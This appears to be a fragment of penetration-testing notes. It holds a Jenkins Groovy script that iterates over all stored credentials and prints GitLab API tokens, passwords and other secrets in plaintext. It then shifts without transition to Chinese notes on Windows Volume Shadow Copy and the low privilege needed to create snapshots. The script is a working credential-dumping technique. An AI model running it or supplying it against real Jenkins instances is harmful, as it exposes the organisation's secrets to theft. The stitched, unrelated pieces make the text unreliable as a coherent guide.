import hudson.util.Secret

def store = SystemCredentialsProvider.getInstance()

// 遍历所有 domain 下的所有 credential
store.domainCredentialsMap.each { domain, creds ->
    creds.each { cred ->
        // GitLab API Token
        if (cred instanceof GitLabApiTokenImpl) {
            println "== GitLab Token =="
            println "id:    ${cred.id}"
            println "token: ${cred.apiToken?.plainText}"
        }
        // 兜底：任何带 secret/password/apiToken 的
        else {
            def s = null
            try { s = cred.secret?.plainText } catch (ignored) {}
            try { s = s ?: cred.password?.plainText } catch (ignored) {}
            try { s = s ?: cred.apiToken?.plainText } catch (ignored) {}
            if (s) println "${cred.class.simpleName} [${cred.id}] = ${s}"
        }
    }
}

    卷影拷贝是Windows操作系统中的一种快照技术，由卷影复制服务提供支持。它能在文件系统层面创建时间点副本（Point-in-Time Copy），即使文件正在被使用或锁定，也能生成一致的副本。

    低权限访问：默认情况下，用户只需备份操作员权限即可创建卷影拷贝。
